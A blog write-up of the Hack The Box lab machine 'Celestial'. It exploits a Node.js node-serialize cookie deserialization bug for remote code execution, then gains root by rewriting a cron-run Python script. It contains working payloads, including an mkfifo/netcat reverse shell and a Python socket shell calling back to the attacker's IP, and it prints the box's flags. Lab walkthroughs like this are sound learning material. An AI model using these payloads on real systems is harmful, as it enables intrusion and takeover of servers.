---
layout: post
title: Hackthebox Celestial Walkthrough
categories: HackTheBox
---

![placeholder](https://inar1.github.io/public/images/2019-10-05/celestial-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
To learn a new technique/knowledge, solve all machines (As much as possible!!).<br>
This is a walkthrough of a box "Celestial".<br>

### Complation
49th / 131 boxes

## Solution
### 1. Initial Enumeration

TCP Port Scanning:
{% highlight console %}
root@kali:~# nmap -p- 10.10.10.85 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-22 11:46 EEST
Nmap scan report for 10.10.10.85
Host is up (0.039s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2743.74 seconds
{% endhighlight %}

gobuster port 3000:
{% highlight console %}
root@kali:~# gobuster dir -u http://10.10.10.85:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .js
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.85:3000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     js
[+] Timeout:        10s
===============================================================
2019/09/23 00:13:30 Starting gobuster
===============================================================
===============================================================
2019/09/23 00:43:06 Finished
===============================================================
{% endhighlight %}

### 2. Getting User

By accessing the website on port 3000, we can find unique coolkie base64 encoded.
{% highlight console %}
root@kali:~# curl http://10.10.10.85:3000 -i
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D; Max-Age=900; Path=/; Expires=Sun, 29 Sep 2019 06:39:17 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 12
ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
Date: Sun, 29 Sep 2019 06:24:17 GMT
Connection: keep-alive

<h1>404</h1>
{% endhighlight %}

Then, try to decode. Since '%3D' is url encoded value of '=', we have to decode it manually.<br>
(Or if we use burp suite, we can use decoder.)
{% highlight console %}
root@kali:~# echo 'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==' | base64 -d
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
{% endhighlight %}

We found some parameters in the cookie.<br>
Then, fuzz this node.js webapp with sending some special values in the cookie.<br>
We can find that if we send "+" as special number, we get following syntax error.
{% highlight console %}
root@kali:~# echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+"}' | base64
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVt
YiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrIn0=
{% endhighlight %}
{% highlight console %}
root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrIn0='
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1074
Date: Fri, 04 Oct 2019 15:28:48 GMT
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected end of input<br> &nbsp; &nbsp;at /home/sun/server.js:13:29<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/sun/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)</pre>
</body>
</html>
{% endhighlight %}

On the other hand, if we send following as a payload, we don't get this syntax error
{% highlight console %}
root@kali:~# echo -n '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+2"}' | base64
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVt
YiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrMiJ9
{% endhighlight %}
{% highlight console %}
root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIrMiJ9'
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 25
ETag: W/"19-TNVBDF0e2JD28Mnzt96ajQ0A3vw"
Date: Fri, 04 Oct 2019 15:37:37 GMT
Connection: keep-alive

Hey Dummy 2+2 + 2+2 is 26
{% endhighlight %}

This means the value of "num" is not used as strings and is used as an argument of eval() or something.<br>
More precisely, the value of "num" is serialized on the web server.<br>
Then, google like following. We can find this blog <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">Exploiting Node.js deserialization bug for Remote Code Execution</a>
{% highlight console %}
nodejs serialization exploit
{% endhighlight %}

According to that blog, to build the payload for RCE, we need following node.js code and run it.
{% highlight console %}
root@kali:~# cat buildRCE.js 
var y = {
 rce : function(){
 require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
{% endhighlight %}
{% highlight shell %}
root@kali:~# node buildRCE.js 
Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });\n }"}
{% endhighlight %}

However, <strong>This payload didn't work for me.</strong><br>
In this article <a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/">Deserialization Vulnerabilities: Attacking Deserialization in JS</a>, it's written like <em>During the deserialization process, anything after a special tag $$ND_FUNC$$ goes directly to eval function</em>.<br>
This means we don't need the part "function()" like following.
{% highlight console %}
{"anything_here":"_$$ND_FUNC$$_console.log(1)"}
{% endhighlight %}

We can check if the payload correctly by writing following script and executing.<br>
Remove the "function(){\n" and "\n }" part at the bottom<br>
(Don't forget to put a "\" for each single quote!!)
{% highlight console %}
root@kali:~# cat serialize.js 
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'uname -a\', function(error, stdout, stderr) { console.log(stdout) })"}'
serialize.unserialize(payload);
{% endhighlight %}
{% highlight console %}
root@kali:~# node serialize.js 
Linux kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-6kali1 (2019-07-22) x86_64 GNU/Linux
{% endhighlight %}

By combining previous information, we can obtain the payload.<br>
Also, we need a reverse shell payload which we don't need to use both single quote and double quote.<br>
Meaning we have to merge the followings.
{% highlight console %}
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+2"}
{% endhighlight %}
{% highlight console %}
{"rce":"_$$ND_FUNC$$_require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });"}
{% endhighlight %}
{% highlight console %}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.30 443 >/tmp/f
{% endhighlight %}

Full Payload:
{% highlight console %}
{"username":"Dummy","country":"Lameville","city":"Lametown","num":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.30 443 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })"}
{% endhighlight %}

Now we had a full payload.<br>
We need base64 encoding for the payload and make sure to run a netcat listener.
{% highlight console %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...

{% endhighlight %}
{% highlight console %}
root@kali:~# curl http://10.10.10.85:3000 -i --cookie 'profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IkxhbWV2aWxsZSIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMzAgNDQzID4vdG1wL2YnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KSJ9'
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1072
Date: Sat, 05 Oct 2019 06:05:46 GMT
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected identifier<br> &nbsp; &nbsp;at /home/sun/server.js:13:29<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/sun/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/sun/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)</pre>
</body>
</html>
{% endhighlight %}

Now we got a reverse shell as a user "sun".
{% highlight console %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.85] 56418
/bin/sh: 0: can't access tty; job control turned off
$ whoami
sun
{% endhighlight %}

user.txt is in the directory "/home/sun/Documents".
{% highlight console %}
$ pwd
/home/sun/Documents

$ ls
script.py
user.txt

$ cat user.txt
9a093cd22ce86b7f41db4116e80d0b0f
{% endhighlight %}

### 3. Getting Root

In the syslog, we can confirm that cron is running "/home/sun/Documents/script.py" in every 5 minutes.
{% highlight console %}
$ tail syslog
Oct  5 02:05:46 sun gnome-session[3685]:     at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
Oct  5 02:05:46 sun gnome-session[3685]:     at next (/home/sun/node_modules/express/lib/router/route.js:137:13)
Oct  5 02:05:46 sun gnome-session[3685]:     at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)
Oct  5 02:05:46 sun gnome-session[3685]:     at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
Oct  5 02:05:46 sun gnome-session[3685]:     at /home/sun/node_modules/express/lib/router/index.js:281:22
Oct  5 02:05:46 sun gnome-session[3685]:     at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)
Oct  5 02:05:46 sun gnome-session[3685]:     at next (/home/sun/node_modules/express/lib/router/index.js:275:10)
Oct  5 02:05:46 sun gnome-session[3685]:     at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)
Oct  5 02:05:46 sun gnome-session[3685]:     at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
Oct  5 02:10:01 sun CRON[8246]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
{% endhighlight %}

Since we have write permission for "/home/sun/Documents/script.py", we can take advantage of that.<br>
We can find a short python payload on the <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a>
{% highlight console %}
oot@kali:~# cat python_rshell.txt 
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.30",8080));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
{% endhighlight %}

Then, prepare needed command like following.
{% highlight console %}
root@kali:~# cat python_rshell.txt 
echo 'import socket,subprocess,os;' > script.py
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script.py
echo 's.connect(("10.10.14.30",8080));os.dup2(s.fileno(),0);' >> script.py
echo 'os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> script.py
{% endhighlight %}

Then, run these commands on the window which we got a reverse shell as a user.
{% highlight console %}
$ echo 'import socket,subprocess,os;' > script.py
$ echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);' >> script.py
$ echo 's.connect(("10.10.14.30",8080));os.dup2(s.fileno(),0);' >> script.py
$ echo 'os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> script.py
{% endhighlight %}

Make sure to launch the reverse shell listener.<br>
Now we can achieve a reverse shell as a root user.
{% highlight console %}
root@kali:~# nc -nlvp 8080
listening on [any] 8080 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.85] 48518
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
{% endhighlight %}

root.txt is in the directory "/root".
{% highlight console %}
# pwd         
/root

# cat root.txt
ba1d0019200a54e370ca151007a8095a
{% endhighlight %}
